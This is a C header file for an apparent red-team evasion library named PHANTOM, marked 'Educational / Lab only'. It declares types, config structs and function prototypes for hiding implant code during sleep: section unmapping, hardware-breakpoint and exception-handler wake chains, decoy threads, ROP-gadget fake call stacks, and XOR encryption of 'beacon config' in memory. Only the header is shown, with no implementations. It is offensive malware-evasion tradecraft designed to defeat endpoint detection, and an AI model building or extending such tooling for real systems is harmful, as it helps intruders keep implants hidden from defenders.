// ============================================================
// phantom_core.h — PHANTOM Sleep Masking + Stack Spoofing
// Core definitions: NT API typedefs, config, runtime context
//
// Architecture: 5-Pillar combined approach
//   P1 — Section Phantom     (memory unmapped during sleep)
//   P2 — NtDelayExecution    (alertable wait, clean call stack)
//   P3 — HWBP + VEH          (hardware-breakpoint wake chain)
//   P4 — Decoy Thread        (behavioral camouflage)
//   P5 — Stack Spoofing      (gadget-pivot fake stack — NEW)
//
// P5 Details:
//   Finds "jmp [rsp+0x28]" gadget in ntdll executable sections.
//   Allocates heap-based fake stack with legit frames:
//     slot 0:  gadget addr (ntdll)        — NtDelay's "return addr"
//     slot 8-32: shadow space             — NtDelay overwrites
//     slot 40: RtlUserThreadStart (ntdll)  — fake legit frame
//     slot 48: continuation trampoline     — spoofed_continue VA
//     slot 56: BaseThreadInitThunk (k32)   — fake legit frame
//   Naked asm trampoline saves real RSP, pivots to fake stack,
//   jmps to NtDelay. After NtDelay returns via gadget chain,
//   continuation trampoline restores real RSP and rets to caller.
//
// Usage: Educational / Lab only
// Compile: x64 MinGW (GCC) — uses __attribute__((naked))
//          MSVC x64 does NOT support inline asm — needs .asm file
// ============================================================

#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>

// ─── Minimal NT Types (replaces winternl.h dependency) ──
// MinGW (especially older / 32-bit only) doesn't ship winternl.h.
// We define only what we actually need — keeps code portable.
#ifndef _NTDEF_        // MinGW-w64 guards NT types with _NTDEF_
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;

// OBJECT_ATTRIBUTES — used in NtCreateSection / NtCreateThreadEx
// We always pass NULL, but the typedef needs the type to exist.
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;              // PUNICODE_STRING (we don't use it)
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#endif // _NTDEF_

// ─── NT Status ──────────────────────────────────────
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

// ─── Section Inherit ────────────────────────────────
typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

// ─── NT API Function Pointer Types ──────────────────

typedef NTSTATUS(NTAPI* FN_NtDelayExecution)(
    BOOLEAN Alertable, PLARGE_INTEGER Interval);

typedef NTSTATUS(NTAPI* FN_NtCreateSection)(
    PHANDLE Section, ACCESS_MASK Access, POBJECT_ATTRIBUTES ObjAttr,
    PLARGE_INTEGER MaxSize, ULONG PageProt, ULONG AllocAttr, HANDLE FileHandle);

typedef NTSTATUS(NTAPI* FN_NtMapViewOfSection)(
    HANDLE Section, HANDLE Process, PVOID* Base, ULONG_PTR ZeroBits,
    SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize,
    DWORD Inherit, ULONG AllocType, ULONG Protect);

typedef NTSTATUS(NTAPI* FN_NtUnmapViewOfSection)(
    HANDLE Process, PVOID Base);

typedef NTSTATUS(NTAPI* FN_NtGetContextThread)(
    HANDLE Thread, PCONTEXT Ctx);

typedef NTSTATUS(NTAPI* FN_NtSetContextThread)(
    HANDLE Thread, PCONTEXT Ctx);

typedef NTSTATUS(NTAPI* FN_NtCreateThreadEx)(
    PHANDLE Thread, ACCESS_MASK Access, POBJECT_ATTRIBUTES ObjAttr,
    HANDLE Process, PVOID StartRoutine, PVOID Arg, ULONG Flags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttrList);

// ─── PHANTOM Configuration (caller sets this) ────────
typedef struct _PHANTOM_CONFIG {
    DWORD   sleep_ms;       // Base sleep duration (ms)
    DWORD   jitter_pct;     // Jitter ± percent (0–50)
    BOOL    enable_decoy;   // P4: spawn decoy activity thread
    BOOL    enable_hwbp;    // P3: hardware breakpoint wake chain
    BOOL    enable_spoof;   // P5: stack spoofing via gadget pivot
    BOOL    verbose;        // Extra debug output
} PHANTOM_CONFIG;

// ─── PHANTOM Runtime Context (internal state) ────────
typedef struct _PHANTOM_CTX {

    // [P1] Section phantom state
    HANDLE  hSection;           // Kernel section object (survives unmap)
    PVOID   pMappedBase;        // Current VA mapping (NULL = unmapped)
    SIZE_T  mappedSize;         // Region size

    // [P3] HWBP / VEH state
    PVOID   hVeh;               // VEH handle (for removal on wake)
    PVOID   hwbpTarget;         // DR0 target address

    // [P2/P3] Wake synchronisation
    HANDLE  hWakeTimer;         // Waitable timer (fires APC)
    HANDLE  hWakeEvent;         // Event: set by APC on remap done

    // [P4] Decoy thread — persistent (created once at init)
    HANDLE  hDecoyThread;
    HANDLE  hDecoyStop;         // Manual-reset: set to kill thread at destroy
    HANDLE  hDecoyRun;          // Auto-reset:  pulse to activate activity

    // Resolved NT function pointers
    FN_NtDelayExecution     pNtDelay;
    FN_NtCreateSection      pNtCreateSec;
    FN_NtMapViewOfSection   pNtMapView;
    FN_NtUnmapViewOfSection pNtUnmapView;
    FN_NtGetContextThread   pNtGetCtx;
    FN_NtSetContextThread   pNtSetCtx;
    FN_NtCreateThreadEx     pNtCreateThread;

    // [P5] Stack Spoofing state — NEW
    PVOID   pJmpRspGadget;          // Gadget addr in ntdll (jmp [rsp+X] OR add rsp,X; ret)
    DWORD   gadgetType;             // 0=jmp[rsp+X], 1=add_rsp_X_ret
    DWORD   gadgetOffset;           // X value (continuation slot = 8 + X)
    PVOID   pRtlUserThreadStart;    // ntdll!RtlUserThreadStart VA (fake frame)
    PVOID   pBaseThreadInitThunk;   // kernel32!BaseThreadInitThunk VA (fake frame)
    PVOID   pRtlExitUserThread;     // ntdll!RtlExitUserThread VA (for clean exit)
    PVOID   pFakeStack;             // heap-allocated 4KB fake stack
    SIZE_T  fakeStackSize;          // size of fake stack allocation
    BOOL    spoofReady;             // spoofing initialized successfully?

    // Runtime context flags
    BOOL    verbose;
    BOOL    initialized;

} PHANTOM_CTX;

// ─── Exports: phantom_impl.c ─────────────────────────

// Core NT API + setup
BOOL phantom_resolve_apis   (PHANTOM_CTX* ctx);

// P1: Section Phantom
BOOL phantom_section_create (PHANTOM_CTX* ctx, PVOID code, SIZE_T sz);
BOOL phantom_section_unmap  (PHANTOM_CTX* ctx);
BOOL phantom_section_remap  (PHANTOM_CTX* ctx);
void phantom_section_destroy(PHANTOM_CTX* ctx);

// P2: NtDelayExecution (direct, no spoofing — fallback)
void phantom_ntdelay        (PHANTOM_CTX* ctx, DWORD ms);

// P5: Stack Spoofing — RAS (Return Address Shadowing)
BOOL phantom_init_spoof     (PHANTOM_CTX* ctx);   // Find gadget + setup globals
void phantom_destroy_spoof  (PHANTOM_CTX* ctx);   // Cleanup
void phantom_spoofed_delay  (PHANTOM_CTX* ctx, DWORD ms);  // Spoofed NtDelay call
// phantom_restore_frames is called from asm (phantom_spoofed_continue)
// Restores shadowed return addresses after sleep
void phantom_restore_frames (void);

// P7: HWBP-Redirected Continuation
// Arms HWBP DR1 on ntdll!RtlUserThreadStart.
// When gadget rets to slot 48 (ntdll addr), HWBP fires.
// VEH handler redirects execution to real caller.
// Result: ZERO phantom_eng frames visible during sleep.
BOOL phantom_p7_arm_hwbp    (PHANTOM_CTX* ctx, PVOID addr);
BOOL phantom_p7_clear_hwbp  (PHANTOM_CTX* ctx);

// P6: Heap Encryption — beacon config protect
BOOL phantom_init_heap_protect (void);   // Allocate + fill config buffer
void phantom_destroy_heap_protect(void);  // Free config buffer
void phantom_encrypt_heap    (void);     // XOR encrypt before sleep
void phantom_decrypt_heap    (void);     // XOR decrypt after wake

// P3: HWBP + VEH
BOOL phantom_hwbp_arm       (PHANTOM_CTX* ctx, PVOID addr);
BOOL phantom_hwbp_clear     (PHANTOM_CTX* ctx);
LONG WINAPI phantom_veh     (PEXCEPTION_POINTERS ep);

// P4: Decoy Thread
BOOL phantom_decoy_init   (PHANTOM_CTX* ctx);
void phantom_decoy_start  (PHANTOM_CTX* ctx);
void phantom_decoy_pause  (PHANTOM_CTX* ctx);
void phantom_decoy_stop   (PHANTOM_CTX* ctx);
void phantom_decoy_destroy(PHANTOM_CTX* ctx);

// Utility
DWORD phantom_jitter        (DWORD base, DWORD pct);

// ─── Exports: phantom_engine.c ───────────────────────
BOOL  PhantomInit   (PHANTOM_CTX* ctx);
BOOL  PhantomSleep  (PHANTOM_CTX* ctx, PHANTOM_CONFIG* cfg);
void  PhantomDestroy(PHANTOM_CTX* ctx);
